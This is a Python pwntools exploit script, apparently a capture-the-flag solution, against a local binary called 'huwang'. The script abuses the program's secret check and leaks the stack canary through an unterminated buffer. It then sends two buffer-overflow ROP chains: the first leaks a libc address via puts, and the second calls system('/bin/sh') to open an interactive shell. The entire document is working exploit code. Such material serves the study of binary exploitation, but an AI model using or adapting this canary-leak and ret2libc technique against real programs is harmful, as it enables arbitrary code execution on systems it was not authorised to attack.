from pwn import *
context.log_level='debug'
sh = process('./huwang')

def six(name,rd,secret,flag=1):
    sh.recvuntil('>> \n')
    sh.sendline('666')
    sh.recvuntil('name\n')
    sh.send(name)
    sh.recvuntil('secret?\n')
    sh.sendline('y')
    sh.recvuntil('secret:\n')
    sh.sendline(str(rd))
    if flag == 1:
        sh.recvuntil('secret\n')
        sh.send(secret)

six('aaa',-1,'bbb',0)
sh.recvuntil('timeout~')
sh = process('./huwang')
libc = ELF('./libc.so.6')

six('a'*0x19,1,'4ae71336e44bf9bf79d2752e234818a5'.decode('hex'))

sh.recvuntil('a'*0x19)
canary = u64('\x00'+sh.recvn(7))
print 'canary: '+hex(canary)
sh.recvuntil('occupation?\n')
sh.send('a' * 0xff)
sh.recvuntil('[Y/N]\n')
sh.sendline('Y')
#gdb.attach(sh)
shellcode = 'a' * 0x108 + p64(canary) + p64(0)
shellcode += p64(0x0000000000401573) + p64(0x0602F70) + p64(0x40101C)
sh.send(shellcode)
gdb.attach(sh)
sh.recvuntil('Congratulations, ')
libc_addr = u64(sh.recvn(6) + '\x00' * 2) - libc.symbols['puts']
sh.recvuntil('occupation?\n')
sh.send('a' * 0xff)
sh.recvuntil('[Y/N]\n')
sh.sendline('Y')
shellcode = 'a' * 0x108 + p64(canary) + p64(0)
shellcode += p64(0x0000000000401573) + p64(next(libc.search('/bin/sh')) + libc_addr) + p64(libc_addr + libc.symbols['system'])
sh.send(shellcode)

sh.interactive()
